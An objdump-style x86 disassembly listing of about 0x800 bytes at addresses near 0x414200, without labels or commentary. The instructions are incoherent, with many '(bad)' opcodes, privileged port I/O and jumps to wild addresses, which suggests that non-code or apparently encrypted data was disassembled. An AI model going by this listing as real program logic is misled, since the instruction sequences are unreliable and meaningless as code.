  414202:	jp     0x414206
  414204:	jmp    0x9e91:0xc57fc268
  41420b:	test   DWORD PTR [eax-0x19c4f301],0xac40ee64
  414215:	mov    dl,0xa8
  414217:	mov    ecx,0x2e23d610
  41421c:	mov    edx,0xd4ab6552
  414221:	(bad)  [edx+0x1901a00e]
  414227:	loop   0x4141b2
  414229:	pushf  
  41422a:	sbb    ch,dh
  41422c:	ror    DWORD PTR [esi-0x78],cl
  41422f:	(bad)  
  414230:	xchg   ebp,eax
  414231:	outs   dx,DWORD PTR ds:[esi]
  414232:	mov    ebp,0x216eb9fc
  414237:	mov    al,0x79
  414239:	sub    ecx,DWORD PTR [edi]
  41423b:	push   eax
  41423c:	add    DWORD PTR [ebx+0x77],ecx
  41423f:	das    
  414240:	jge    0x414223
  414242:	(bad)  
  414243:	into   
  414244:	mov    ah,0xa1
  414246:	and    eax,0xe9d59234
  41424b:	sub    al,0xe6
  41424d:	pop    ebx
  41424e:	mov    edi,0x5d33e58
  414253:	test   eax,0xca35ce4d
  414258:	push   ss
  414259:	pop    eax
  41425a:	xor    eax,ecx
  41425c:	leave  
  41425d:	test   BYTE PTR [edx],cl
  41425f:	pop    edx
  414260:	(bad)  [ecx+0x6c]
  414263:	addr16 popf 
  414265:	cmc    
  414266:	in     al,dx
  414267:	popa   
  414268:	xor    ch,BYTE PTR [ebp+0x17]
  41426b:	inc    esp
  41426c:	(bad)  
  41426d:	dec    esp
  41426e:	mov    esp,0x3b370b2d
  414273:	mov    eax,ds:0xf60d737b
  414278:	jle    0x41422a
  41427a:	pop    ds
  41427b:	call   0xd8eceb95
  414280:	iret   
  414281:	add    bl,ch
  414283:	jo     0x414244
  414285:	lock jmp 0xfc39:0xa4c803b1
  41428d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41428e:	jge    0x41427f
  414290:	or     eax,0xb7f77ec2
  414295:	rcl    esi,cl
  414297:	bound  edx,QWORD PTR [ebx+0x7251ae8e]
  41429d:	mov    edx,0x5d3658ff
  4142a2:	or     ebp,DWORD PTR [ebx-0x690d32ea]
  4142a8:	adc    eax,0x3529d308
  4142ad:	dec    ecx
  4142ae:	repnz cli 
  4142b0:	dec    edx
  4142b1:	ja     0x414254
  4142b3:	push   edx
  4142b4:	stc    
  4142b5:	fcom   QWORD PTR [ebx+edi*8+0x479b6efa]
  4142bc:	out    0x61,al
  4142be:	inc    ebx
  4142bf:	dec    edx
  4142c0:	sbb    eax,0x64018088
  4142c5:	test   al,0x5c
  4142c7:	in     eax,0xaa
  4142c9:	loopne 0x414302
  4142cb:	mov    ebp,0x4a6440e7
  4142d0:	xchg   ebx,eax
  4142d1:	leave  
  4142d2:	retf   0x18c3
  4142d5:	adc    eax,0x18a04736
  4142da:	test   al,0x98
  4142dc:	xor    DWORD PTR [esi-0x3cbed8de],0x4f40f216
  4142e6:	in     al,dx
  4142e7:	int3   
  4142e8:	or     DWORD PTR [esi-0x20916d34],ecx
  4142ee:	or     eax,0xbf61e2fb
  4142f3:	xchg   edi,eax
  4142f4:	mov    ds:0x4d717178,eax
  4142f9:	ss sub dh,cl
  4142fc:	out    dx,al
  4142fd:	add    ch,dl
  4142ff:	bound  esi,QWORD PTR [edi+esi*1]
  414302:	pop    edx
  414303:	fstp   QWORD PTR [eax]
  414305:	xchg   ebp,eax
  414306:	lods   al,BYTE PTR ds:[esi]
  414307:	and    dl,ah
  414309:	or     dh,BYTE PTR [ecx+0x57]
  41430c:	aas    
  41430d:	xor    al,0xef
  41430f:	fdiv   QWORD PTR [eax-0x6]
  414312:	idiv   DWORD PTR [edx+0x65]
  414315:	out    0xf2,eax
  414317:	mov    ch,0x9a
  414319:	ret    0x524a
  41431c:	push   0xffffffc7
  41431e:	xchg   ecx,eax
  41431f:	pop    ds
  414320:	mov    ebx,0x17ba95e0
  414325:	rol    WORD PTR [eax+0x71],cl
  414329:	into   
  41432a:	sub    al,0xb0
  41432c:	mov    al,ds:0x8c164a34
  414331:	adc    DWORD PTR [ebx-0x7edaf92e],0xca8d2a76
  41433b:	and    edi,0x9cb0c83b
  414341:	aam    0x2
  414343:	jno    0x414317
  414345:	mov    esi,0xed0c7ea6
  41434a:	xlat   BYTE PTR ds:[ebx]
  41434b:	shr    edx,cl
  41434d:	add    cl,BYTE PTR ds:[eax+0x68]
  414351:	int3   
  414352:	pushw  ss
  414354:	stc    
  414355:	sbb    ebx,DWORD PTR [edx-0x73]
  414358:	bnd jno 0x41434b
  41435b:	into   
  41435c:	xchg   DWORD PTR [ebx+0x5353b916],ecx
  414362:	(bad)  
  414364:	fimul  WORD PTR [edx-0x1c]
  414367:	aas    
  414368:	push   edx
  414369:	sub    DWORD PTR [ebp+ebp*1+0x201c530c],edi
  414370:	lods   al,BYTE PTR ds:[esi]
  414371:	sub    eax,0x753e9591
  414376:	dec    edx
  414377:	in     eax,dx
  414378:	loopne 0x41432e
  41437a:	bound  esp,QWORD PTR [edx+0x309d5d41]
  414380:	jl     0x414397
  414382:	fptan  
  414384:	in     eax,dx
  414385:	mov    ah,0xb5
  414387:	push   es
  414388:	push   esi
  414389:	or     bh,dl
  41438b:	xor    al,0x54
  41438d:	xor    DWORD PTR [ecx+edi*1-0x1f],0xde80052e
  414395:	aaa    
  414396:	fld    QWORD PTR [edi+0x56]
  414399:	pop    edx
  41439a:	imul   esi,eax,0xfffffff7
  41439d:	(bad)  
  41439e:	arpl   ax,bp
  4143a0:	in     eax,dx
  4143a1:	(bad)  
  4143a3:	(bad)  
  4143a4:	iret   
  4143a5:	jo     0x4143f0
  4143a7:	and    ch,BYTE PTR [ebx+eiz*8-0x25f288ae]
  4143ae:	outs   dx,DWORD PTR ds:[esi]
  4143af:	ins    BYTE PTR es:[edi],dx
  4143b0:	and    eax,0x6295eebb
  4143b5:	pop    ebp
  4143b6:	repnz (bad) 
  4143b8:	sbb    al,BYTE PTR [edx+0x3486e520]
  4143be:	fmulp  st(4),st
  4143c0:	in     al,dx
  4143c1:	or     DWORD PTR [edi],ebx
  4143c3:	or     eax,0xf1d26c59
  4143c8:	std    
  4143c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143ca:	ret    0xb509
  4143cd:	cmc    
  4143ce:	adc    eax,0xc91ad739
  4143d3:	and    ebx,DWORD PTR [ebp-0x35]
  4143d6:	scas   al,BYTE PTR es:[edi]
  4143d7:	and    al,0xb2
  4143d9:	mov    dl,BYTE PTR [ebp-0x3e]
  4143dc:	inc    esi
  4143dd:	jns    0x4143b2
  4143df:	sti    
  4143e0:	retf   
  4143e1:	popf   
  4143e2:	xchg   BYTE PTR [ebx-0x9239e58],al
  4143e8:	repnz cs mov ch,0xbd
  4143ec:	cmp    BYTE PTR [ecx-0x7e],0x0
  4143f0:	adc    eax,0x797b6225
  4143f5:	and    BYTE PTR [ebp-0x26],al
  4143f8:	xchg   DWORD PTR [esi+esi*1+0x6d375ac8],edx
  4143ff:	int3   
  414400:	mov    DWORD PTR [edx+eax*8+0x27baf002],ebx
  414407:	mov    dh,0x1f
  414409:	shl    DWORD PTR [edx],1
  41440b:	mov    dl,0x3b
  41440d:	popa   
  41440e:	fwait
  41440f:	cwde   
  414410:	sbb    BYTE PTR [ebp+0x14],0xb0
  414414:	loope  0x414477
  414416:	movnti DWORD PTR [edi-0x74],ebp
  41441a:	hlt    
  41441b:	lea    ebp,[edi]
  41441d:	stos   DWORD PTR es:[edi],eax
  41441e:	ja     0x414471
  414420:	jns    0x414401
  414422:	jmp    0x414448
  414424:	dec    ebp
  414425:	cmp    esi,DWORD PTR [eax]
  414427:	arpl   WORD PTR [edx-0x61f64216],bx
  41442d:	add    dl,al
  41442f:	pop    edi
  414430:	outs   dx,BYTE PTR ds:[esi]
  414431:	adc    BYTE PTR [ebx-0x4a],dl
  414434:	mov    WORD PTR [edx+eax*1+0xacfba05],ds
  41443b:	enter  0x75bb,0xbc
  41443f:	sub    al,0x6
  414441:	outs   dx,BYTE PTR ds:[esi]
  414442:	out    0x72,eax
  414444:	push   0x3a
  414446:	add    BYTE PTR [esi-0x3e823f96],bh
  41444c:	dec    BYTE PTR [ecx+0x2e6acd12]
  414452:	test   BYTE PTR ds:0xa3196122,dl
  414458:	sub    al,0x63
  41445a:	sbb    BYTE PTR [ebx+0x1c],0xc8
  41445e:	or     DWORD PTR [ebx+0x25],0xffffffa5
  414462:	jp     0x414410
  414464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414465:	shl    DWORD PTR [edx-0x40],0x5f
  414469:	rcl    dl,1
  41446b:	ret    0x8532
  41446e:	test   DWORD PTR [edx-0x367e8c78],0x7b3c6d16
  414478:	retf   0x9f4f
  41447b:	outs   dx,DWORD PTR ds:[esi]
  41447c:	test   BYTE PTR [eax-0x4b],ah
  41447f:	int3   
  414480:	mov    ds:0x8d556024,al
  414485:	rol    BYTE PTR [ecx],1
  414487:	jo     0x41449d
  414489:	inc    edx
  41448a:	jmp    0x414418
  41448c:	jns    0x4144e4
  41448e:	push   edx
  41448f:	and    bh,dh
  414491:	xchg   esp,eax
  414492:	enter  0x516a,0x1e
  414496:	test   cl,bl
  414498:	sub    eax,0xfc5fcc73
  41449d:	push   ebx
  41449e:	push   eax
  41449f:	xlat   BYTE PTR ds:[ebx]
  4144a0:	mov    ecx,0x1a8912c6
  4144a5:	lods   eax,DWORD PTR ds:[esi]
  4144a6:	gs pop ss
  4144a8:	sub    eax,0xcd582641
  4144ad:	inc    esp
  4144ae:	mov    ecx,0x56998da5
  4144b3:	add    edx,esi
  4144b5:	xor    al,0x82
  4144b7:	nop
  4144b8:	lock fs dec ebp
  4144bb:	mov    dh,0x29
  4144bd:	stos   DWORD PTR es:[edi],eax
  4144be:	stos   BYTE PTR es:[edi],al
  4144bf:	mov    ch,0x87
  4144c1:	clc    
  4144c2:	mov    ecx,DWORD PTR [ebp+edi*8-0x29]
  4144c6:	ins    BYTE PTR es:[edi],dx
  4144c7:	test   al,bh
  4144c9:	ret    
  4144ca:	and    BYTE PTR [esi],0xd8
  4144cd:	(bad)  [edi]
  4144cf:	iret   
  4144d0:	add    al,0xd6
  4144d2:	addr16 dec esp
  4144d4:	and    esp,DWORD PTR [edx-0x27]
  4144d7:	loope  0x41448d
  4144d9:	push   ebp
  4144da:	xchg   edi,eax
  4144db:	bound  edi,QWORD PTR [edi-0x75]
  4144de:	mul    ch
  4144e0:	ret    0x536e
  4144e3:	mov    dh,0x36
  4144e5:	push   0x6da90bb0
  4144ea:	data16 and BYTE PTR [edx+0x33],0x97
  4144ef:	adc    bh,BYTE PTR [edi+0x2e]
  4144f2:	mov    ecx,0x35e66216
  4144f7:	fs jmp 0x414531
  4144fa:	push   edx
  4144fb:	or     WORD PTR [eax+0x22],sp
  4144ff:	dec    ecx
  414500:	sbb    edx,edx
  414502:	push   ebx
  414503:	pop    ecx
  414504:	mov    bh,0xd0
  414506:	push   esi
  414507:	dec    ecx
  414508:	dec    esp
  414509:	dec    ebp
  41450a:	xchg   edx,eax
  41450b:	gs push edx
  41450d:	mov    eax,ds:0xcfabc22b
  414512:	or     edi,DWORD PTR [ecx]
  414514:	repnz pop ss
  414516:	stos   BYTE PTR es:[edi],al
  414517:	sahf   
  414518:	mov    ch,0xfb
  41451a:	and    edx,eax
  41451c:	inc    esp
  41451d:	add    BYTE PTR es:[ebp-0x7efa96ec],al
  414524:	jl     0x414583
  414526:	rcr    ebp,0x94
  414529:	call   FWORD PTR [esi-0x51cf6b61]
  41452f:	cdq    
  414530:	xchg   edi,eax
  414531:	bnd ret 0xa640
  414535:	xor    BYTE PTR [eax+0x7e5b5d35],dl
  41453b:	(bad)  
  41453c:	out    dx,eax
  41453d:	mov    DWORD PTR ds:0x1b292c7e,esp
  414543:	rol    BYTE PTR [ebx+0x575a1043],0x3a
  41454a:	loop   0x414527
  41454c:	std    
  41454d:	popf   
  41454e:	retf   
  41454f:	popf   
  414550:	pop    ebp
  414551:	pop    esi
  414552:	adc    BYTE PTR [ebx-0x468cee],al
  414558:	test   DWORD PTR [ebx-0x37],edi
  41455b:	push   ds
  41455c:	mov    BYTE PTR [edx+0xc5fef38],dl
  414562:	mov    esp,0x779f2de
  414567:	hlt    
  414568:	xchg   edi,eax
  414569:	pop    edi
  41456a:	rcr    cl,cl
  41456c:	adc    al,BYTE PTR [esi]
  41456e:	pop    ebp
  41456f:	push   edx
  414570:	push   esp
  414571:	mov    edi,0x728b7590
  414576:	mov    edx,0x6fb4b199
  41457b:	sbb    al,dl
  41457d:	out    0x74,al
  41457f:	(bad)  
  414580:	sub    bl,dl
  414582:	in     al,0x5b
  414584:	mov    edi,0xb08ea229
  414589:	dec    edx
  41458a:	ss dec ebx
  41458c:	gs dec eax
  41458e:	es mov eax,0x6709f7b
  414594:	dec    eax
  414595:	inc    edx
  414596:	xor    ecx,edx
  414598:	ins    DWORD PTR es:[edi],dx
  414599:	jge    0x414600
  41459b:	push   ebp
  41459c:	pop    ebp
  41459d:	lods   eax,DWORD PTR ds:[esi]
  41459e:	xchg   edx,eax
  41459f:	push   cs
  4145a0:	push   ss
  4145a1:	stos   DWORD PTR es:[edi],eax
  4145a2:	shl    BYTE PTR [edx-0x5a],1
  4145a5:	cli    
  4145a6:	aam    0xe6
  4145a8:	clc    
  4145a9:	test   al,0xfd
  4145ab:	(bad)  
  4145ac:	scas   al,BYTE PTR es:[edi]
  4145ad:	cmp    eax,DWORD PTR [esi-0x59d6d72e]
  4145b3:	leave  
  4145b4:	or     BYTE PTR [esi+eiz*8-0x38f2e80e],bl
  4145bb:	pop    edi
  4145bc:	fnstsw WORD PTR [edx+0x1cee7d7a]
  4145c2:	arpl   WORD PTR [eax],dx
  4145c4:	jno    0x414576
  4145c6:	in     al,0x18
  4145c8:	pop    eax
  4145c9:	and    DWORD PTR ds:0x2036357d,ebx
  4145cf:	sub    edx,DWORD PTR [eax-0x49]
  4145d2:	mov    ah,0xfc
  4145d4:	mov    edx,0xf1103ce
  4145d9:	jnp    0x414633
  4145db:	stos   DWORD PTR es:[edi],eax
  4145dc:	dec    ebp
  4145dd:	sub    dh,BYTE PTR [edi+ebp*8]
  4145e0:	loop   0x41456e
  4145e2:	fwait
  4145e3:	xlat   BYTE PTR ds:[ebx]
  4145e4:	fcomp  DWORD PTR [edx+0x38]
  4145e7:	repz stc 
  4145e9:	in     al,0xb8
  4145eb:	sub    al,0xf8
  4145ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145ee:	push   cs
  4145ef:	mov    edi,0x823db7ac
  4145f4:	iret   
  4145f5:	(bad)  
  4145f6:	repz pop ds
  4145f8:	and    BYTE PTR cs:[esi],ch
  4145fb:	mov    bl,0xed
  4145fd:	mov    ebp,0xa20323f2
  414602:	call   0x3a503dd4
  414607:	loope  0x41459e
  414609:	ss jg  0x41460b
  41460c:	(bad)  
  41460d:	neg    BYTE PTR [ecx-0x1182ce1a]
  414613:	(bad)  
  414614:	mov    edx,0xa439a4c0
  414619:	les    edx,FWORD PTR [edx-0x6f5d944b]
  41461f:	xor    eax,0x6f8caecb
  414624:	aas    
  414625:	ss (bad) 
  414627:	mov    ecx,0x70506c6c
  41462c:	mov    dh,0xf0
  41462e:	sub    al,0xe0
  414630:	and    DWORD PTR [ebx-0x55],esi
  414633:	mov    al,ds:0x6581f52a
  414638:	shl    al,0x54
  41463b:	int3   
  41463c:	call   0x59f65910
  414641:	add    al,0xbd
  414643:	sar    bl,0xa4
  414646:	jmp    0x10583545
  41464b:	pop    ss
  41464c:	fdivr  DWORD PTR [eax+0x1a781a6b]
  414652:	mov    ds:0x7e21df5b,eax
  414657:	test   esi,0xa1ae4cf7
  41465d:	mov    DWORD PTR [eax+0x6b],ebp
  414660:	popa   
  414661:	cmp    al,0x8
  414663:	call   0x6b699401
  414668:	sub    eax,DWORD PTR [ecx+0x25348a92]
  41466e:	test   DWORD PTR [esi],esp
  414670:	mov    edi,0x4ee505dd
  414675:	add    bl,ah
  414677:	sbb    al,0x42
  414679:	mov    ebp,0x8e3eeff0
  41467e:	rcl    DWORD PTR [esp+ebx*8],1
  414681:	pop    ecx
  414682:	pop    es
  414683:	fwait
  414684:	call   0xd086a9ab
  414689:	xchg   BYTE PTR [ebp+0x32],al
  41468c:	mov    ebx,0xbc7aff59
  414691:	repnz retf 0x6d2e
  414695:	pop    ebp
  414696:	push   0xffffffe9
  414698:	adc    bh,BYTE PTR [ebp+0x54628546]
  41469e:	stc    
  41469f:	mov    ds:0x425c4cda,eax
  4146a4:	push   esp
  4146a5:	push   edi
  4146a6:	jmp    0x414695
  4146a8:	lahf   
  4146a9:	loope  0x4146c7
  4146ab:	ins    BYTE PTR es:[edi],dx
  4146ac:	lock sbb DWORD PTR [esi+0x49952aae],edx
  4146b3:	popa   
  4146b4:	push   eax
  4146b5:	or     BYTE PTR [ecx],ch
  4146b7:	push   cs
  4146b8:	xchg   esp,eax
  4146b9:	mov    bl,0xcc
  4146bb:	div    BYTE PTR [esi-0x14bdf8d3]
  4146c1:	sub    eax,0xfb72ee58
  4146c6:	mov    eax,ds:0xd5141619
  4146cb:	pop    es
  4146cc:	sub    al,0xe5
  4146ce:	push   0xc
  4146d0:	addr16 xor al,0x45
  4146d3:	pop    ss
  4146d4:	add    ecx,edi
  4146d6:	fild   QWORD PTR [esp+eax*8-0x32735df3]
  4146dd:	add    DWORD PTR [ebx+0x5813ae9],ebx
  4146e3:	aaa    
  4146e4:	jb     0x414682
  4146e6:	cmp    bh,dh
  4146e8:	sahf   
  4146e9:	fwait
  4146ea:	mov    dl,ch
  4146ec:	stos   BYTE PTR es:[edi],al
  4146ed:	cmp    al,0x91
  4146ef:	sub    al,0x0
  4146f1:	xlat   BYTE PTR ds:[ebx]
  4146f2:	mov    bh,0x4e
  4146f4:	or     ecx,DWORD PTR [ecx+0x6e]
  4146f7:	(bad)  
  4146f8:	scas   eax,DWORD PTR es:[edi]
  4146f9:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4146fb:	sbb    BYTE PTR [eax+esi*2],0x5f
  4146ff:	xchg   esp,eax
  414700:	icebp  
  414701:	jo     0x4146f8
  414703:	xlat   BYTE PTR ds:[ebx]
  414704:	jmp    0xe192d481
  414709:	add    ebx,DWORD PTR [ebx+0x298fde3]
  41470f:	and    edx,DWORD PTR [esi-0x4420ff8d]
  414715:	out    0xc3,al
  414717:	pusha  
  414718:	in     eax,dx
  414719:	adc    eax,0x8d0df585
  41471e:	push   0x2667104e
  414723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414724:	hlt    
  414725:	cli    
  414726:	(bad)  
  414728:	mov    ch,0x19
  41472a:	xor    al,0xed
  41472c:	jge    0x4146fc
  41472e:	stos   BYTE PTR es:[edi],al
  41472f:	cmp    eax,0xb694a55
  414734:	mov    eax,ds:0xc525c229
  414739:	or     al,0xe9
  41473b:	sbb    al,0x2e
  41473e:	lds    edx,FWORD PTR [ebp+0x56]
  414741:	push   esi
  414742:	sbb    DWORD PTR [ebx-0x3f641e50],ecx
  414748:	xor    dh,ch
  41474a:	and    esp,DWORD PTR fs:[ebp-0x79]
  41474e:	pop    esi
  41474f:	push   0x7cff4b71
  414754:	retf   
  414755:	lea    edx,[ecx+0x1f91c4df]
  41475b:	idiv   BYTE PTR [eax+0x76]
  41475e:	pop    ebx
  41475f:	inc    ebx
  414760:	(bad)  
  414761:	push   edx
  414762:	gs std 
  414764:	adc    eax,DWORD PTR [edx+0x4e]
  414767:	enter  0x9407,0xd0
  41476b:	pop    ebp
  41476c:	mov    cl,0x9
  41476e:	add    ch,bh
  414770:	ret    
  414771:	jmp    0x596fa506
  414776:	leave  
  414777:	inc    ecx
  414778:	sbb    BYTE PTR [esi],bl
  41477a:	lahf   
  41477b:	mov    BYTE PTR [edi-0x6f558086],0xd1
  414782:	sbb    BYTE PTR [eax-0x6840a42d],0x2e
  414789:	mov    DWORD PTR gs:[ebx+0x65],esp
  41478d:	cmp    esi,ebx
  41478f:	mov    ds:0x756be241,al
  414794:	inc    ebp
  414795:	jmp    0x11f55aea
  41479a:	scas   eax,DWORD PTR es:[edi]
  41479b:	aaa    
  41479c:	xor    DWORD PTR [ebx],esi
  41479e:	pop    edx
  41479f:	out    dx,eax
  4147a0:	mov    ds:0x6d83412c,eax
  4147a5:	push   es
  4147a6:	pop    edx
  4147a7:	push   ss
  4147a8:	xchg   BYTE PTR ss:[ebx-0x75962cab],cl
  4147af:	xor    DWORD PTR [edx],ebp
  4147b1:	(bad)  
  4147b2:	sbb    DWORD PTR [ecx-0x765512c],ebp
  4147b8:	dec    ebp
  4147b9:	sahf   
  4147ba:	mov    edi,DWORD PTR ds:0xed867bdf
  4147c0:	outs   dx,BYTE PTR ds:[esi]
  4147c1:	imul   esp,DWORD PTR [ecx-0x6ee497c5],0x60
  4147c8:	mov    ds:0x2b49cc34,al
  4147cd:	fs loopne 0x4147d1
  4147d0:	and    BYTE PTR [eax-0x45],ah
  4147d3:	std    
  4147d4:	hlt    
  4147d5:	in     al,0xa1
  4147d7:	mov    edi,DWORD PTR [ecx-0x53]
  4147da:	int    0xaf
  4147dc:	dec    DWORD PTR [esi]
  4147de:	xor    eax,0x71a88343
  4147e3:	nop
  4147e4:	ins    BYTE PTR es:[edi],dx
  4147e5:	or     al,BYTE PTR [ebp-0x4cf8cea4]
  4147eb:	out    dx,al
  4147ec:	mov    edi,0xc7533499
  4147f1:	aad    0xcf
  4147f3:	pop    esi
  4147f4:	lahf   
  4147f5:	mov    cl,0x28
  4147f7:	leave  
  4147f8:	lods   al,BYTE PTR ds:[esi]
  4147f9:	push   ebp
  4147fa:	jl     0x4147ff
  4147fc:	cld    
  4147fd:	jmp    0xd4af:0xd14f4d7b
  414804:	sbb    ebp,DWORD PTR [ecx-0x1dccaf05]
  41480a:	fst    QWORD PTR [esi+eiz*2-0x3421796c]
  414811:	adc    BYTE PTR [edx+0x59],bh
  414814:	(bad)  
  414815:	dec    eax
  414816:	div    BYTE PTR [esp+eax*4-0x69]
  41481a:	push   ss
  41481b:	outs   dx,BYTE PTR ds:[esi]
  41481c:	std    
  41481d:	jl     0x4147ab
  41481f:	jo     0x41482f
  414821:	sub    al,0xea
  414823:	inc    edi
  414824:	(bad)  
  414825:	lods   eax,DWORD PTR ds:[esi]
  414826:	cs mov dh,0xc
  414829:	xchg   bl,al
  41482b:	xchg   BYTE PTR [ecx-0xe],dl
  41482e:	pop    ebx
  41482f:	lahf   
  414830:	mov    ebx,eax
  414832:	mov    ebp,0xb23cd95a
  414837:	push   ss
  414838:	xchg   ebx,eax
  414839:	jo     0x414859
  41483b:	pushf  
  41483c:	lea    ebp,[eax-0x2c]
  41483f:	adc    BYTE PTR [ebx+0x77],al
  414842:	push   ebx
  414843:	mov    bh,0xbc
  414845:	xchg   ebp,eax
  414846:	dec    ebp
  414847:	mov    bh,0x89
  414849:	or     esi,DWORD PTR [ebx]
  41484b:	xor    al,0x4c
  41484d:	adc    DWORD PTR [ebp-0x4529cb87],eax
  414853:	arpl   WORD PTR [ecx],di
  414855:	scas   al,BYTE PTR es:[edi]
  414856:	aam    0xfe
  414858:	pop    ebx
  414859:	inc    DWORD PTR [ebx]
  41485b:	sbb    edi,DWORD PTR [edi-0x6c]
  41485e:	mov    gs,WORD PTR [edi+0x73]
  414861:	adc    al,0xca
  414863:	mov    DWORD PTR [ecx+eiz*4-0x5af17110],edx
  41486a:	xor    cx,dx
  41486d:	out    dx,eax
  41486e:	mov    ebx,0x4acdb7e1
  414873:	sbb    cl,BYTE PTR ds:0x1ea336b3
  414879:	(bad)  
  41487a:	mov    ds,WORD PTR [ecx]
  41487c:	mov    bh,0x91
  41487e:	psraw  mm7,QWORD PTR [esi-0x1088fe04]
  414885:	lahf   
  414886:	and    eax,edi
  414888:	call   0x8248cb1e
  41488d:	dec    ebx
  41488e:	push   0x2fe4338f
  414893:	dec    ebx
  414894:	jbe    0x414858
  414896:	adc    dh,BYTE PTR [ebx-0x4e]
  414899:	mov    al,0xaf
  41489b:	not    edx
  41489d:	mov    eax,ds:0xfa124500
  4148a2:	cs je  0x414863
  4148a5:	xlat   BYTE PTR ds:[ebx]
  4148a6:	mov    eax,ds:0xa16ee8df
  4148ab:	test   DWORD PTR [edi],ecx
  4148ad:	enter  0xd364,0x35
  4148b1:	mov    esp,0xee280a50
  4148b6:	dec    esi
  4148b7:	jns    0x41491d
  4148b9:	sub    ebp,DWORD PTR [edx*4-0x1371931e]
  4148c0:	add    BYTE PTR ss:[edi+0x49],ah
  4148c4:	fild   WORD PTR [eax]
  4148c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148c7:	pop    ebx
  4148c8:	xor    eax,DWORD PTR [esi+0x52]
  4148cb:	mov    ds:0x8a958498,al
  4148d0:	int3   
  4148d1:	adc    DWORD PTR [edx],edx
  4148d3:	xchg   DWORD PTR [ecx],esi
  4148d5:	inc    edi
  4148d6:	mov    ecx,0x587a774b
  4148db:	push   0xfffffff7
  4148dd:	ins    DWORD PTR es:[edi],dx
  4148de:	lods   eax,DWORD PTR ds:[esi]
  4148df:	push   0x57
  4148e1:	sbb    al,0x88
  4148e3:	jecxz  0x4148be
  4148e5:	je     0x41495c
  4148e7:	adc    DWORD PTR [ebp+0x1],ebx
  4148ea:	popa   
  4148eb:	and    ebx,ebx
  4148ed:	sub    ebx,DWORD PTR [eax-0x5581c95f]
  4148f3:	add    DWORD PTR [ecx],ebx
  4148f5:	test   al,0x1c
  4148f7:	pop    esi
  4148f8:	sbb    eax,0x323f454d
  4148fd:	mov    edi,0xa17029da
  414902:	xor    eax,0x29968d43
  414907:	retf   0xdd64
  41490a:	fst    QWORD PTR [esi-0x677271db]
  414910:	(bad)  
  414911:	and    bl,BYTE PTR [ecx-0x68]
  414914:	mov    ah,0x5a
  414916:	fisttp DWORD PTR [esi-0x553ce42e]
  41491c:	into   
  41491d:	sbb    eax,DWORD PTR [esp+ecx*4+0x68]
  414921:	sub    DWORD PTR [edx-0x4e05a604],edi
  414927:	lods   eax,DWORD PTR ds:[esi]
  414928:	je     0x4149a6
  41492a:	push   ss
  41492b:	cmp    ebp,DWORD PTR [ebp+eax*1+0x1e88920a]
  414932:	cs enter 0xcdea,0xa
  414937:	pop    DWORD PTR [ebx+eiz*2-0x339f8a08]
  41493e:	inc    esi
  41493f:	xor    eax,0xc94bf200
  414944:	hlt    
  414945:	mov    ecx,0x327bba7f
  41494a:	sbb    eax,0xba9e903d
  41494f:	mov    dh,0x2d
  414951:	xchg   ecx,eax
  414952:	push   edi
  414953:	lock stos BYTE PTR es:[edi],al
  414955:	(bad)  
  414956:	in     eax,0x8
  414958:	dec    eax
  414959:	scas   eax,DWORD PTR es:[edi]
  41495a:	mov    bl,0x5c
  41495c:	hlt    
  41495d:	mov    WORD PTR [esi],cs
  41495f:	ret    
  414960:	jp     0x4149a9
  414962:	mov    WORD PTR [ecx-0x408028b6],gs
  414968:	ret    
  414969:	jns    0x414960
  41496b:	es aas 
  41496d:	or     BYTE PTR [ecx+0x63],ch
  414970:	mov    al,ds:0x1b2cb3c7
  414975:	add    ax,0x693
  414979:	fild   QWORD PTR [eax]
  41497b:	(bad)  
  41497c:	and    eax,0xf8760071
  414981:	jb     0x41490e
  414983:	mov    ebp,0x6ee8fc66
  414988:	pushf  
  414989:	inc    ecx
  41498a:	iret   
  41498b:	mov    ecx,0x306e6480
  414990:	xchg   ebp,eax
  414991:	add    eax,0x5e6428ab
  414996:	jae    0x4149c1
  414998:	mov    eax,ds:0x11a4a6db
  41499d:	xbegin 0x20f8d914
  4149a3:	push   esi
  4149a4:	ret    0x11cd
  4149a7:	pop    ss
  4149a8:	pop    es
  4149a9:	or     esi,DWORD PTR [edx+0x8]
  4149ac:	in     al,0x23
  4149ae:	add    DWORD PTR [eax+0x28],esi
  4149b1:	mov    ch,0xbe
  4149b3:	and    esi,DWORD PTR [edx]
  4149b5:	sbb    bl,ah
  4149b7:	pop    ebp
  4149b8:	and    eax,0xa3303397
  4149bd:	sub    BYTE PTR [esi+0x68],bh
  4149c0:	pop    ds
  4149c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149c2:	sub    DWORD PTR [ebx+0x32],eax
  4149c5:	movaps XMMWORD PTR [ebp+ebx*1-0x722c26b2],xmm2
  4149cd:	(bad)  
  4149ce:	adc    al,0x19
  4149d0:	xor    bh,BYTE PTR [ebx+0x4bea9057]
  4149d6:	sub    bh,BYTE PTR ds:[eax]
  4149d9:	loope  0x414a54
  4149db:	frstor [eax]
  4149dd:	inc    edi
  4149de:	xchg   ecx,eax
  4149df:	scas   eax,DWORD PTR es:[edi]
  4149e0:	push   ds
  4149e1:	xor    al,BYTE PTR ds:0x8a7bd0f3
  4149e7:	jl     0x414a0c
  4149e9:	sbb    DWORD PTR [edi],eax
  4149eb:	(bad)
  4149ee:	jle    0x414977
  4149f0:	es push ss
  4149f2:	inc    ebp
  4149f3:	enter  0xcd4e,0xcf
  4149f7:	ss push edi
  4149f9:	inc    ebx
  4149fa:	ss jle 0x4149fd
  4149fd:	jno    0x414a7a
  4149ff:	in     al,0x6a
  414a01:	in     al,dx
  414a02:	mov    DWORD PTR ds:0xab683912,eax
  414a08:	xchg   BYTE PTR [edi-0x12],ah
  414a0b:	jg     0x414a0a
  414a0d:	xor    dh,BYTE PTR [edi]
  414a0f:	adc    eax,0x29f487c8
  414a14:	xchg   edx,eax
  414a15:	xchg   ecx,eax
  414a16:	aad    0x37
  414a18:	div    BYTE PTR [eax-0x78157dba]
  414a1e:	mov    edi,DWORD PTR [eax]
  414a20:	mov    ebp,0x609de702
  414a25:	(bad)  
  414a26:	hlt    
  414a27:	mov    eax,0x8b06faf1
  414a2c:	pop    ebx
